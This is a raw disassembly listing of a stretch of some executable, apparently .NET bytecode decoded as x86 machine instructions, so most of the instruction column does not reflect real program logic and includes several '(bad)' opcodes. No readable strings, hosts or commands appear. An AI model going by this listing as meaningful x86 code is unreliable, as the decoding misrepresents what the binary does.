  405914:	7e 95                	jle    0x4058ab
  405916:	00 00                	add    %al,(%eax)
  405918:	04 28                	add    $0x28,%al
  40591a:	6b 00 00             	imul   $0x0,(%eax),%eax
  40591d:	0a 6f 37             	or     0x37(%edi),%ch
  405920:	00 00                	add    %al,(%eax)
  405922:	0a 13                	or     (%ebx),%dl
  405924:	04 12                	add    $0x12,%al
  405926:	04 28                	add    $0x28,%al
  405928:	38 00                	cmp    %al,(%eax)
  40592a:	00 0a                	add    %cl,(%edx)
  40592c:	2d 41 02 16 25       	sub    $0x25160241,%eax
  405931:	0a 7d 9b             	or     -0x65(%ebp),%bh
  405934:	00 00                	add    %al,(%eax)
  405936:	04 02                	add    $0x2,%al
  405938:	11 04 7d 9d 00 00 04 	adc    %eax,0x400009d(,%edi,2)
  40593f:	02 7c 9c 00          	add    0x0(%esp,%ebx,4),%bh
  405943:	00 04 12             	add    %al,(%edx,%edx,1)
  405946:	04 02                	add    $0x2,%al
  405948:	28 3a                	sub    %bh,(%edx)
  40594a:	00 00                	add    %al,(%eax)
  40594c:	2b dd                	sub    %ebp,%ebx
  40594e:	96                   	xchg   %eax,%esi
  40594f:	03 00                	add    (%eax),%eax
  405951:	00 02                	add    %al,(%edx)
  405953:	7b 9d                	jnp    0x4058f2
  405955:	00 00                	add    %al,(%eax)
  405957:	04 13                	add    $0x13,%al
  405959:	04 02                	add    $0x2,%al
  40595b:	7c 9d                	jl     0x4058fa
  40595d:	00 00                	add    %al,(%eax)
  40595f:	04 fe                	add    $0xfe,%al
  405961:	15 0a 00 00 01       	adc    $0x100000a,%eax
  405966:	02 15 25 0a 7d 9b    	add    0x9b7d0a25,%dl
  40596c:	00 00                	add    %al,(%eax)
  40596e:	04 12                	add    $0x12,%al
  405970:	04 28                	add    $0x28,%al
  405972:	39 00                	cmp    %eax,(%eax)
  405974:	00 0a                	add    %cl,(%edx)
  405976:	7e 97                	jle    0x40590f
  405978:	00 00                	add    %al,(%eax)
  40597a:	04 17                	add    $0x17,%al
  40597c:	40                   	inc    %eax
  40597d:	fe 00                	incb   (%eax)
  40597f:	00 00                	add    %al,(%eax)
  405981:	7e 99                	jle    0x40591c
  405983:	00 00                	add    %al,(%eax)
  405985:	04 72                	add    $0x72,%al
  405987:	83 04 00 70          	addl   $0x70,(%eax,%eax,1)
  40598b:	28 21                	sub    %ah,(%ecx)
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 2c 0a             	or     (%edx,%ecx,1),%ch
  405992:	72 c9                	jb     0x40595d
  405994:	04 00                	add    $0x0,%al
  405996:	70 80                	jo     0x405918
  405998:	99                   	cltd
  405999:	00 00                	add    %al,(%eax)
  40599b:	04 28                	add    $0x28,%al
  40599d:	70 00                	jo     0x40599f
  40599f:	00 06                	add    %al,(%esi)
  4059a1:	2c 6f                	sub    $0x6f,%al
  4059a3:	28 68 00             	sub    %ch,0x0(%eax)
  4059a6:	00 0a                	add    %cl,(%edx)
  4059a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4059a9:	69 00 00 0a 7e 99    	imul   $0x997e0a00,(%eax),%eax
  4059af:	00 00                	add    %al,(%eax)
  4059b1:	04 28                	add    $0x28,%al
  4059b3:	79 00                	jns    0x4059b5
  4059b5:	00 06                	add    %al,(%esi)
  4059b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b8:	2b 00                	sub    (%eax),%eax
  4059ba:	00 0a                	add    %cl,(%edx)
  4059bc:	13 05 12 05 28 2c    	adc    0x2c280512,%eax
  4059c2:	00 00                	add    %al,(%eax)
  4059c4:	0a 2d 41 02 17 25    	or     0x25170241,%ch
  4059ca:	0a 7d 9b             	or     -0x65(%ebp),%bh
  4059cd:	00 00                	add    %al,(%eax)
  4059cf:	04 02                	add    $0x2,%al
  4059d1:	11 05 7d 9e 00 00    	adc    %eax,0x9e7d
  4059d7:	04 02                	add    $0x2,%al
  4059d9:	7c 9c                	jl     0x405977
  4059db:	00 00                	add    %al,(%eax)
  4059dd:	04 12                	add    $0x12,%al
  4059df:	05 02 28 3b 00       	add    $0x3b2802,%eax
  4059e4:	00 2b                	add    %ch,(%ebx)
  4059e6:	dd fd                	(bad)
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	00 02                	add    %al,(%edx)
  4059ec:	7b 9e                	jnp    0x40598c
  4059ee:	00 00                	add    %al,(%eax)
  4059f0:	04 13                	add    $0x13,%al
  4059f2:	05 02 7c 9e 00       	add    $0x9e7c02,%eax
  4059f7:	00 04 fe             	add    %al,(%esi,%edi,8)
  4059fa:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  4059ff:	02 15 25 0a 7d 9b    	add    0x9b7d0a25,%dl
  405a05:	00 00                	add    %al,(%eax)
  405a07:	04 12                	add    $0x12,%al
  405a09:	05 28 2d 00 00       	add    $0x2d28,%eax
  405a0e:	0a 26                	or     (%esi),%ah
  405a10:	2b 6d 28             	sub    0x28(%ebp),%ebp
  405a13:	68 00 00 0a 6f       	push   $0x6f0a0000
  405a18:	69 00 00 0a 7e 99    	imul   $0x997e0a00,(%eax),%eax
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	04 28                	add    $0x28,%al
  405a22:	78 00                	js     0x405a24
  405a24:	00 06                	add    %al,(%esi)
  405a26:	6f                   	outsl  %ds:(%esi),(%dx)
  405a27:	2b 00                	sub    (%eax),%eax
  405a29:	00 0a                	add    %cl,(%edx)
  405a2b:	13 05 12 05 28 2c    	adc    0x2c280512,%eax
  405a31:	00 00                	add    %al,(%eax)
  405a33:	0a 2d 41 02 18 25    	or     0x25180241,%ch
  405a39:	0a 7d 9b             	or     -0x65(%ebp),%bh
  405a3c:	00 00                	add    %al,(%eax)
  405a3e:	04 02                	add    $0x2,%al
  405a40:	11 05 7d 9e 00 00    	adc    %eax,0x9e7d
  405a46:	04 02                	add    $0x2,%al
  405a48:	7c 9c                	jl     0x4059e6
  405a4a:	00 00                	add    %al,(%eax)
  405a4c:	04 12                	add    $0x12,%al
  405a4e:	05 02 28 3b 00       	add    $0x3b2802,%eax
  405a53:	00 2b                	add    %ch,(%ebx)
  405a55:	dd 8e 02 00 00 02    	fisttpll 0x2000002(%esi)
  405a5b:	7b 9e                	jnp    0x4059fb
  405a5d:	00 00                	add    %al,(%eax)
  405a5f:	04 13                	add    $0x13,%al
  405a61:	05 02 7c 9e 00       	add    $0x9e7c02,%eax
  405a66:	00 04 fe             	add    %al,(%esi,%edi,8)
  405a69:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  405a6e:	02 15 25 0a 7d 9b    	add    0x9b7d0a25,%dl
  405a74:	00 00                	add    %al,(%eax)
  405a76:	04 12                	add    $0x12,%al
  405a78:	05 28 2d 00 00       	add    $0x2d28,%eax
  405a7d:	0a 26                	or     (%esi),%ah
  405a7f:	02 16                	add    (%esi),%dl
  405a81:	7d a0                	jge    0x405a23
  405a83:	00 00                	add    %al,(%eax)
  405a85:	04 00                	add    $0x0,%al
  405a87:	06                   	push   %es
  405a88:	19 59 45             	sbb    %ebx,0x45(%ecx)
  405a8b:	03 00                	add    (%eax),%eax
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	57                   	push   %edi
  405a90:	00 00                	add    %al,(%eax)
  405a92:	00 cd                	add    %cl,%ch
  405a94:	00 00                	add    %al,(%eax)
  405a96:	00 3e                	add    %bh,(%esi)
  405a98:	01 00                	add    %eax,(%eax)
  405a9a:	00 02                	add    %al,(%edx)
  405a9c:	18 17                	sbb    %dl,(%edi)
  405a9e:	1c 73                	sbb    $0x73,%al
  405aa0:	7f 00                	jg     0x405aa2
  405aa2:	00 0a                	add    %cl,(%edx)
  405aa4:	7d a1                	jge    0x405a47
  405aa6:	00 00                	add    %al,(%eax)
  405aa8:	04 02                	add    $0x2,%al
  405aaa:	7b a1                	jnp    0x405a4d
  405aac:	00 00                	add    %al,(%eax)
  405aae:	04 7e                	add    $0x7e,%al
  405ab0:	92                   	xchg   %eax,%edx
  405ab1:	00 00                	add    %al,(%eax)
  405ab3:	04 7e                	add    $0x7e,%al
  405ab5:	93                   	xchg   %eax,%ebx
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	04 28                	add    $0x28,%al
  405aba:	c5 00                	lds    (%eax),%eax
  405abc:	00 0a                	add    %cl,(%edx)
  405abe:	6f                   	outsl  %ds:(%esi),(%dx)
  405abf:	37                   	aaa
  405ac0:	00 00                	add    %al,(%eax)
  405ac2:	0a 13                	or     (%ebx),%dl
  405ac4:	04 12                	add    $0x12,%al
  405ac6:	04 28                	add    $0x28,%al
  405ac8:	38 00                	cmp    %al,(%eax)
  405aca:	00 0a                	add    %cl,(%edx)
  405acc:	2d 41 02 19 25       	sub    $0x25190241,%eax
  405ad1:	0a 7d 9b             	or     -0x65(%ebp),%bh
  405ad4:	00 00                	add    %al,(%eax)
  405ad6:	04 02                	add    $0x2,%al
  405ad8:	11 04 7d 9d 00 00 04 	adc    %eax,0x400009d(,%edi,2)
  405adf:	02 7c 9c 00          	add    0x0(%esp,%ebx,4),%bh
  405ae3:	00 04 12             	add    %al,(%edx,%edx,1)
  405ae6:	04 02                	add    $0x2,%al
  405ae8:	28 3a                	sub    %bh,(%edx)
  405aea:	00 00                	add    %al,(%eax)
  405aec:	2b dd                	sub    %ebp,%ebx
  405aee:	f6 01 00             	testb  $0x0,(%ecx)
  405af1:	00 02                	add    %al,(%edx)
  405af3:	7b 9d                	jnp    0x405a92
  405af5:	00 00                	add    %al,(%eax)
  405af7:	04 13                	add    $0x13,%al
  405af9:	04 02                	add    $0x2,%al
  405afb:	7c 9d                	jl     0x405a9a
  405afd:	00 00                	add    %al,(%eax)
  405aff:	04 fe                	add    $0xfe,%al
  405b01:	15 0a 00 00 01       	adc    $0x100000a,%eax
  405b06:	02 15 25 0a 7d 9b    	add    0x9b7d0a25,%dl
  405b0c:	00 00                	add    %al,(%eax)
  405b0e:	04 12                	add    $0x12,%al
  405b10:	04 28                	add    $0x28,%al
  405b12:	39 00                	cmp    %eax,(%eax)
  405b14:	00 0a                	add    %cl,(%edx)
  405b16:	02 7b a1             	add    -0x5f(%ebx),%bh
  405b19:	00 00                	add    %al,(%eax)
  405b1b:	04 7e                	add    $0x7e,%al
  405b1d:	94                   	xchg   %eax,%esp
  405b1e:	00 00                	add    %al,(%eax)
  405b20:	04 16                	add    $0x16,%al
  405b22:	16                   	push   %ss
  405b23:	14 fe                	adc    $0xfe,%al
  405b25:	06                   	push   %es
  405b26:	5a                   	pop    %edx
  405b27:	00 00                	add    %al,(%eax)
  405b29:	06                   	push   %es
  405b2a:	73 4d                	jae    0x405b79
  405b2c:	00 00                	add    %al,(%eax)
  405b2e:	0a 28                	or     (%eax),%ch
  405b30:	75 00                	jne    0x405b32
  405b32:	00 06                	add    %al,(%esi)
  405b34:	6f                   	outsl  %ds:(%esi),(%dx)
  405b35:	4e                   	dec    %esi
  405b36:	00 00                	add    %al,(%eax)
  405b38:	0a 13                	or     (%ebx),%dl
  405b3a:	06                   	push   %es
  405b3b:	12 06                	adc    (%esi),%al
  405b3d:	28 4f 00             	sub    %cl,0x0(%edi)
  405b40:	00 0a                	add    %cl,(%edx)
  405b42:	2d 41 02 1a 25       	sub    $0x251a0241,%eax
  405b47:	0a 7d 9b             	or     -0x65(%ebp),%bh
  405b4a:	00 00                	add    %al,(%eax)
  405b4c:	04 02                	add    $0x2,%al
  405b4e:	11 06                	adc    %eax,(%esi)
  405b50:	7d a2                	jge    0x405af4
  405b52:	00 00                	add    %al,(%eax)
  405b54:	04 02                	add    $0x2,%al
  405b56:	7c 9c                	jl     0x405af4
  405b58:	00 00                	add    %al,(%eax)
  405b5a:	04 12                	add    $0x12,%al
  405b5c:	06                   	push   %es
  405b5d:	02 28                	add    (%eax),%ch
  405b5f:	3c 00                	cmp    $0x0,%al
  405b61:	00 2b                	add    %ch,(%ebx)
  405b63:	dd 80 01 00 00 02    	fldl   0x2000001(%eax)
  405b69:	7b a2                	jnp    0x405b0d
  405b6b:	00 00                	add    %al,(%eax)
  405b6d:	04 13                	add    $0x13,%al
  405b6f:	06                   	push   %es
  405b70:	02 7c a2 00          	add    0x0(%edx,%eiz,4),%bh
  405b74:	00 04 fe             	add    %al,(%esi,%edi,8)
  405b77:	15 08 00 00 1b       	adc    $0x1b000008,%eax
  405b7c:	02 15 25 0a 7d 9b    	add    0x9b7d0a25,%dl
  405b82:	00 00                	add    %al,(%eax)
  405b84:	04 12                	add    $0x12,%al
  405b86:	06                   	push   %es
  405b87:	28 50 00             	sub    %dl,0x0(%eax)
  405b8a:	00 0a                	add    %cl,(%edx)
  405b8c:	80 90 00 00 04 7e 90 	adcb   $0x90,0x7e040000(%eax)
  405b93:	00 00                	add    %al,(%eax)
  405b95:	04 7e                	add    $0x7e,%al
  405b97:	91                   	xchg   %eax,%ecx
  405b98:	00 00                	add    %al,(%eax)
  405b9a:	04 73                	add    $0x73,%al
  405b9c:	11 00                	adc    %eax,(%eax)
  405b9e:	00 06                	add    %al,(%esi)
  405ba0:	6f                   	outsl  %ds:(%esi),(%dx)
  405ba1:	15 00 00 06 6f       	adc    $0x6f060000,%eax
  405ba6:	37                   	aaa
  405ba7:	00 00                	add    %al,(%eax)
  405ba9:	0a 13                	or     (%ebx),%dl
  405bab:	04 12                	add    $0x12,%al
  405bad:	04 28                	add    $0x28,%al
  405baf:	38 00                	cmp    %al,(%eax)
  405bb1:	00 0a                	add    %cl,(%edx)
  405bb3:	2d 41 02 1b 25       	sub    $0x251b0241,%eax
  405bb8:	0a 7d 9b             	or     -0x65(%ebp),%bh
  405bbb:	00 00                	add    %al,(%eax)
  405bbd:	04 02                	add    $0x2,%al
  405bbf:	11 04 7d 9d 00 00 04 	adc    %eax,0x400009d(,%edi,2)
  405bc6:	02 7c 9c 00          	add    0x0(%esp,%ebx,4),%bh
  405bca:	00 04 12             	add    %al,(%edx,%edx,1)
  405bcd:	04 02                	add    $0x2,%al
  405bcf:	28 3a                	sub    %bh,(%edx)
  405bd1:	00 00                	add    %al,(%eax)
  405bd3:	2b dd                	sub    %ebp,%ebx
  405bd5:	0f 01 00             	sgdtl  (%eax)
  405bd8:	00 02                	add    %al,(%edx)
  405bda:	7b 9d                	jnp    0x405b79
  405bdc:	00 00                	add    %al,(%eax)
  405bde:	04 13                	add    $0x13,%al
  405be0:	04 02                	add    $0x2,%al
  405be2:	7c 9d                	jl     0x405b81
  405be4:	00 00                	add    %al,(%eax)
  405be6:	04 fe                	add    $0xfe,%al
  405be8:	15 0a 00 00 01       	adc    $0x100000a,%eax
  405bed:	02 15 25 0a 7d 9b    	add    0x9b7d0a25,%dl
  405bf3:	00 00                	add    %al,(%eax)
  405bf5:	04 12                	add    $0x12,%al
  405bf7:	04 28                	add    $0x28,%al
  405bf9:	39 00                	cmp    %eax,(%eax)
  405bfb:	00 0a                	add    %cl,(%edx)
  405bfd:	02 14 7d a1 00 00 04 	add    0x40000a1(,%edi,2),%dl
  405c04:	de 13                	ficoms (%ebx)
  405c06:	13 07                	adc    (%edi),%eax
  405c08:	02 11                	add    (%ecx),%dl
  405c0a:	07                   	pop    %es
  405c0b:	7d 9f                	jge    0x405bac
  405c0d:	00 00                	add    %al,(%eax)
  405c0f:	04 02                	add    $0x2,%al
  405c11:	17                   	pop    %ss
  405c12:	7d a0                	jge    0x405bb4
  405c14:	00 00                	add    %al,(%eax)
  405c16:	04 de                	add    $0xde,%al
  405c18:	00 02                	add    %al,(%edx)
  405c1a:	7b a0                	jnp    0x405bbc
  405c1c:	00 00                	add    %al,(%eax)
  405c1e:	04 13                	add    $0x13,%al
  405c20:	08 11                	or     %dl,(%ecx)
  405c22:	08 17                	or     %dl,(%edi)
  405c24:	40                   	inc    %eax
  405c25:	87 00                	xchg   %eax,(%eax)
  405c27:	00 00                	add    %al,(%eax)
  405c29:	02 02                	add    (%edx),%al
  405c2b:	7b 9f                	jnp    0x405bcc
  405c2d:	00 00                	add    %al,(%eax)
  405c2f:	04 74                	add    $0x74,%al
  405c31:	0b 00                	or     (%eax),%eax
  405c33:	00 01                	add    %al,(%ecx)
  405c35:	7d a3                	jge    0x405bda
  405c37:	00 00                	add    %al,(%eax)
  405c39:	04 20                	add    $0x20,%al
  405c3b:	10 27                	adc    %ah,(%edi)
  405c3d:	00 00                	add    %al,(%eax)
  405c3f:	28 6b 00             	sub    %ch,0x0(%ebx)
  405c42:	00 0a                	add    %cl,(%edx)
  405c44:	6f                   	outsl  %ds:(%esi),(%dx)
  405c45:	37                   	aaa
  405c46:	00 00                	add    %al,(%eax)
  405c48:	0a 13                	or     (%ebx),%dl
  405c4a:	04 12                	add    $0x12,%al
  405c4c:	04 28                	add    $0x28,%al
  405c4e:	38 00                	cmp    %al,(%eax)
  405c50:	00 0a                	add    %cl,(%edx)
  405c52:	2d 3e 02 1c 25       	sub    $0x251c023e,%eax
  405c57:	0a 7d 9b             	or     -0x65(%ebp),%bh
  405c5a:	00 00                	add    %al,(%eax)
  405c5c:	04 02                	add    $0x2,%al
  405c5e:	11 04 7d 9d 00 00 04 	adc    %eax,0x400009d(,%edi,2)
  405c65:	02 7c 9c 00          	add    0x0(%esp,%ebx,4),%bh
  405c69:	00 04 12             	add    %al,(%edx,%edx,1)
  405c6c:	04 02                	add    $0x2,%al
  405c6e:	28 3a                	sub    %bh,(%edx)
  405c70:	00 00                	add    %al,(%eax)
  405c72:	2b de                	sub    %esi,%ebx
  405c74:	73 02                	jae    0x405c78
  405c76:	7b 9d                	jnp    0x405c15
  405c78:	00 00                	add    %al,(%eax)
  405c7a:	04 13                	add    $0x13,%al
  405c7c:	04 02                	add    $0x2,%al
  405c7e:	7c 9d                	jl     0x405c1d
  405c80:	00 00                	add    %al,(%eax)
  405c82:	04 fe                	add    $0xfe,%al
  405c84:	15 0a 00 00 01       	adc    $0x100000a,%eax
  405c89:	02 15 25 0a 7d 9b    	add    0x9b7d0a25,%dl
  405c8f:	00 00                	add    %al,(%eax)
  405c91:	04 12                	add    $0x12,%al
  405c93:	04 28                	add    $0x28,%al
  405c95:	39 00                	cmp    %eax,(%eax)
  405c97:	00 0a                	add    %cl,(%edx)
  405c99:	02 7b a3             	add    -0x5d(%ebx),%bh
  405c9c:	00 00                	add    %al,(%eax)
  405c9e:	04 6f                	add    $0x6f,%al
  405ca0:	3a 00                	cmp    (%eax),%al
  405ca2:	00 0a                	add    %cl,(%edx)
  405ca4:	28 29                	sub    %ch,(%ecx)
  405ca6:	00 00                	add    %al,(%eax)
  405ca8:	0a 02                	or     (%edx),%al
  405caa:	14 7d                	adc    $0x7d,%al
  405cac:	a3 00 00 04 02       	mov    %eax,0x2040000
  405cb1:	14 7d                	adc    $0x7d,%al
  405cb3:	9f                   	lahf
  405cb4:	00 00                	add    %al,(%eax)
  405cb6:	04 38                	add    $0x38,%al
  405cb8:	c3                   	ret
  405cb9:	fd                   	std
  405cba:	ff                   	(bad)
  405cbb:	ff 13                	call   *(%ebx)
  405cbd:	09 02                	or     %eax,(%edx)
  405cbf:	1f                   	pop    %ds
  405cc0:	fe                   	(bad)
  405cc1:	7d 9b                	jge    0x405c5e
  405cc3:	00 00                	add    %al,(%eax)
  405cc5:	04 02                	add    $0x2,%al
  405cc7:	7c 9c                	jl     0x405c65
  405cc9:	00 00                	add    %al,(%eax)
  405ccb:	04 11                	add    $0x11,%al
  405ccd:	09 28                	or     %ebp,(%eax)
  405ccf:	3d 00 00 0a de       	cmp    $0xde0a0000,%eax
  405cd4:	13 02                	adc    (%edx),%eax
  405cd6:	1f                   	pop    %ds
  405cd7:	fe                   	(bad)
  405cd8:	7d 9b                	jge    0x405c75
  405cda:	00 00                	add    %al,(%eax)
  405cdc:	04 02                	add    $0x2,%al
  405cde:	7c 9c                	jl     0x405c7c
  405ce0:	00 00                	add    %al,(%eax)
  405ce2:	04 28                	add    $0x28,%al
  405ce4:	3e 00 00             	add    %al,%ds:(%eax)
  405ce7:	0a 2a                	or     (%edx),%ch
  405ce9:	00 00                	add    %al,(%eax)
  405ceb:	00 41 4c             	add    %al,0x4c(%ecx)
  405cee:	00 00                	add    %al,(%eax)
  405cf0:	00 00                	add    %al,(%eax)
  405cf2:	00 00                	add    %al,(%eax)
  405cf4:	7a 00                	jp     0x405cf6
  405cf6:	00 00                	add    %al,(%eax)
  405cf8:	6d                   	insl   (%dx),%es:(%edi)
  405cf9:	00 00                	add    %al,(%eax)
  405cfb:	00 e7                	add    %ah,%bh
  405cfd:	00 00                	add    %al,(%eax)
  405cff:	00 03                	add    %al,(%ebx)
  405d01:	00 00                	add    %al,(%eax)
  405d03:	00 01                	add    %al,(%ecx)
  405d05:	00 00                	add    %al,(%eax)
  405d07:	01 00                	add    %eax,(%eax)
  405d09:	00 00                	add    %al,(%eax)
  405d0b:	00 73 02             	add    %dh,0x2(%ebx)
  405d0e:	00 00                	add    %al,(%eax)
  405d10:	7f 01                	jg     0x405d13
  405d12:	00 00                	add    %al,(%eax)
  405d14:	f2 03 00             	repnz add (%eax),%eax
  405d17:	00 13                	add    %dl,(%ebx)
  405d19:	00 00                	add    %al,(%eax)
  405d1b:	00 0b                	add    %cl,(%ebx)
  405d1d:	00 00                	add    %al,(%eax)
  405d1f:	01 00                	add    %eax,(%eax)
  405d21:	00 00                	add    %al,(%eax)
  405d23:	00 07                	add    %al,(%edi)
  405d25:	00 00                	add    %al,(%eax)
  405d27:	00 a1 04 00 00 a8    	add    %ah,-0x57fffffc(%ecx)
  405d2d:	04 00                	add    $0x0,%al
  405d2f:	00 19                	add    %bl,(%ecx)
  405d31:	00 00                	add    %al,(%eax)
  405d33:	00 0b                	add    %cl,(%ebx)
  405d35:	00 00                	add    %al,(%eax)
  405d37:	01 13                	add    %edx,(%ebx)
  405d39:	30 02                	xor    %al,(%edx)
  405d3b:	00 2f                	add    %ch,(%edi)
  405d3d:	00 00                	add    %al,(%eax)
  405d3f:	00 2e                	add    %ch,(%esi)
  405d41:	00 00                	add    %al,(%eax)
  405d43:	11 12                	adc    %edx,(%edx)
  405d45:	00 28                	add    %ch,(%eax)
  405d47:	cd 00                	int    $0x0
  405d49:	00 0a                	add    %cl,(%edx)
  405d4b:	7d c3                	jge    0x405d10
  405d4d:	00 00                	add    %al,(%eax)
  405d4f:	04 12                	add    $0x12,%al
  405d51:	00 15 7d c2 00 00    	add    %dl,0xc27d
  405d57:	04 12                	add    $0x12,%al
  405d59:	00 7c c3 00          	add    %bh,0x0(%ebx,%eax,8)
  405d5d:	00 04 12             	add    %al,(%edx,%edx,1)
  405d60:	00 28                	add    %ch,(%eax)
  405d62:	3d 00 00 2b 12       	cmp    $0x122b0000,%eax
  405d67:	00 7c c3 00          	add    %bh,0x0(%ebx,%eax,8)
  405d6b:	00 04 28             	add    %al,(%eax,%ebp,1)
  405d6e:	cf                   	iret
  405d6f:	00 00                	add    %al,(%eax)
  405d71:	0a 2a                	or     (%edx),%ch
  405d73:	00 1b                	add    %bl,(%ebx)
  405d75:	30 03                	xor    %al,(%ebx)
  405d77:	00 79 00             	add    %bh,0x0(%ecx)
  405d7a:	00 00                	add    %al,(%eax)
  405d7c:	2f                   	das
  405d7d:	00 00                	add    %al,(%eax)
  405d7f:	11 7e d0             	adc    %edi,-0x30(%esi)
  405d82:	00 00                	add    %al,(%eax)
  405d84:	0a 0a                	or     (%edx),%cl
  405d86:	28 68 00             	sub    %ch,0x0(%eax)
  405d89:	00 06                	add    %al,(%esi)
  405d8b:	0b 07                	or     (%edi),%eax
  405d8d:	28 6a 00             	sub    %ch,0x0(%edx)
  405d90:	00 06                	add    %al,(%esi)
  405d92:	17                   	pop    %ss
  405d93:	58                   	pop    %eax
  405d94:	0c 08                	or     $0x8,%al
  405d96:	73 d1                	jae    0x405d69
  405d98:	00 00                	add    %al,(%eax)
  405d9a:	0a 0d 07 09 08 28    	or     0x28080907,%cl
  405da0:	69 00 00 06 16 31    	imul   $0x31160600,(%eax),%eax
  405da6:	07                   	pop    %es
  405da7:	09 6f 59             	or     %ebp,0x59(%edi)
  405daa:	00 00                	add    %al,(%eax)
  405dac:	0a 0a                	or     (%edx),%cl
  405dae:	00 07                	add    %al,(%edi)
  405db0:	12 04 28             	adc    (%eax,%ebp,1),%al
  405db3:	6b 00 00             	imul   $0x0,(%eax),%eax
  405db6:	06                   	push   %es
  405db7:	26 11 04 28          	adc    %eax,%es:(%eax,%ebp,1)
  405dbb:	d2 00                	rolb   %cl,(%eax)
  405dbd:	00 0a                	add    %cl,(%edx)
  405dbf:	13 05 06 72 ed 04    	adc    0x4ed7206,%eax
  405dc5:	00 70 28             	add    %dh,0x28(%eax)
  405dc8:	21 00                	and    %eax,(%eax)
  405dca:	00 0a                	add    %cl,(%edx)
  405dcc:	2c 0a                	sub    $0xa,%al
  405dce:	11 05 6f d3 00 00    	adc    %eax,0xd36f
  405dd4:	0a 0a                	or     (%edx),%cl
  405dd6:	2b 13                	sub    (%ebx),%edx
  405dd8:	11 05 6f d3 00 00    	adc    %eax,0xd36f
  405dde:	0a 72 ef             	or     -0x11(%edx),%dh
  405de1:	04 00                	add    $0x0,%al
  405de3:	70 06                	jo     0x405deb
  405de5:	28 65 00             	sub    %ah,0x0(%ebp)
  405de8:	00 0a                	add    %cl,(%edx)
  405dea:	0a 11                	or     (%ecx),%dl
  405dec:	05 6f d4 00 00       	add    $0xd46f,%eax
  405df1:	0a de                	or     %dh,%bl
  405df3:	03 26                	add    (%esi),%esp
  405df5:	de 00                	fiadds (%eax)
  405df7:	06                   	push   %es
  405df8:	2a 00                	sub    (%eax),%al
  405dfa:	00 00                	add    %al,(%eax)
  405dfc:	01 10                	add    %edx,(%eax)
  405dfe:	00 00                	add    %al,(%eax)
  405e00:	00 00                	add    %al,(%eax)
  405e02:	2f                   	das
  405e03:	00 45 74             	add    %al,0x74(%ebp)
  405e06:	00 03                	add    %al,(%ebx)
  405e08:	01 00                	add    %eax,(%eax)
  405e0a:	00 01                	add    %al,(%ecx)
  405e0c:	1b 30                	sbb    (%eax),%esi
  405e0e:	01 00                	add    %eax,(%eax)
  405e10:	0f 00 00             	sldt   (%eax)
  405e13:	00 17                	add    %dl,(%edi)
  405e15:	00 00                	add    %al,(%eax)
  405e17:	11 16                	adc    %edx,(%esi)
  405e19:	0a 28                	or     (%eax),%ch
  405e1b:	67 00 00             	add    %al,(%bx,%si)
  405e1e:	06                   	push   %es
  405e1f:	0a de                	or     %dh,%bl
  405e21:	03 26                	add    (%esi),%esp
  405e23:	de 00                	fiadds (%eax)
  405e25:	06                   	push   %es
  405e26:	2a 00                	sub    (%eax),%al
  405e28:	01 10                	add    %edx,(%eax)
  405e2a:	00 00                	add    %al,(%eax)
  405e2c:	00 00                	add    %al,(%eax)
  405e2e:	02 00                	add    (%eax),%al
  405e30:	08 0a                	or     %cl,(%edx)
  405e32:	00 03                	add    %al,(%ebx)
  405e34:	01 00                	add    %eax,(%eax)
  405e36:	00 01                	add    %al,(%ecx)
  405e38:	1b 30                	sbb    (%eax),%esi
  405e3a:	03 00                	add    (%eax),%eax
  405e3c:	c7 00 00 00 30 00    	movl   $0x300000,(%eax)
  405e42:	00 11                	add    %dl,(%ecx)
  405e44:	73 d5                	jae    0x405e1b
  405e46:	00 00                	add    %al,(%eax)
  405e48:	0a 0a                	or     (%edx),%cl
  405e4a:	72 f7                	jb     0x405e43
  405e4c:	04 00                	add    $0x0,%al
  405e4e:	70 28                	jo     0x405e78
  405e50:	d6                   	salc
  405e51:	00 00                	add    %al,(%eax)
  405e53:	0a 72 fd             	or     -0x3(%edx),%dh
  405e56:	04 00                	add    $0x0,%al
  405e58:	70 28                	jo     0x405e82
  405e5a:	65 00 00             	add    %al,%gs:(%eax)
  405e5d:	0a 72 29             	or     0x29(%edx),%dh
  405e60:	05 00 70 73 d7       	add    $0xd7737000,%eax
  405e65:	00 00                	add    %al,(%eax)
  405e67:	0a 0b                	or     (%ebx),%cl
  405e69:	07                   	pop    %es
  405e6a:	6f                   	outsl  %ds:(%esi),(%dx)
  405e6b:	d8 00                	fadds  (%eax)
  405e6d:	00 0a                	add    %cl,(%edx)
  405e6f:	6f                   	outsl  %ds:(%esi),(%dx)
  405e70:	d9 00                	flds   (%eax)
  405e72:	00 0a                	add    %cl,(%edx)
  405e74:	0c 2b                	or     $0x2b,%al
  405e76:	2c 08                	sub    $0x8,%al
  405e78:	6f                   	outsl  %ds:(%esi),(%dx)
  405e79:	da 00                	fiaddl (%eax)
  405e7b:	00 0a                	add    %cl,(%edx)
  405e7d:	25 72 67 05 00       	and    $0x56772,%eax
  405e82:	70 6f                	jo     0x405ef3
  405e84:	db 00                	fildl  (%eax)
  405e86:	00 0a                	add    %cl,(%edx)
  405e88:	6f                   	outsl  %ds:(%esi),(%dx)
  405e89:	59                   	pop    %ecx
  405e8a:	00 00                	add    %al,(%eax)
  405e8c:	0a 0d 06 09 6f dc    	or     0xdc6f0906,%cl
  405e92:	00 00                	add    %al,(%eax)
  405e94:	0a 2d 07 06 09 6f    	or     0x6f090607,%ch
  405e9a:	dd 00                	fldl   (%eax)
  405e9c:	00 0a                	add    %cl,(%edx)
  405e9e:	6f                   	outsl  %ds:(%esi),(%dx)
  405e9f:	de 00                	fiadds (%eax)
  405ea1:	00 0a                	add    %cl,(%edx)
  405ea3:	08 6f df             	or     %ch,-0x21(%edi)
  405ea6:	00 00                	add    %al,(%eax)
  405ea8:	0a 2d cc de 0a 08    	or     0x80adecc,%ch
  405eae:	2c 06                	sub    $0x6,%al
  405eb0:	08 6f 4b             	or     %ch,0x4b(%edi)
  405eb3:	00 00                	add    %al,(%eax)
  405eb5:	0a dc                	or     %ah,%bl
  405eb7:	06                   	push   %es
  405eb8:	6f                   	outsl  %ds:(%esi),(%dx)
  405eb9:	e0 00                	loopne 0x405ebb
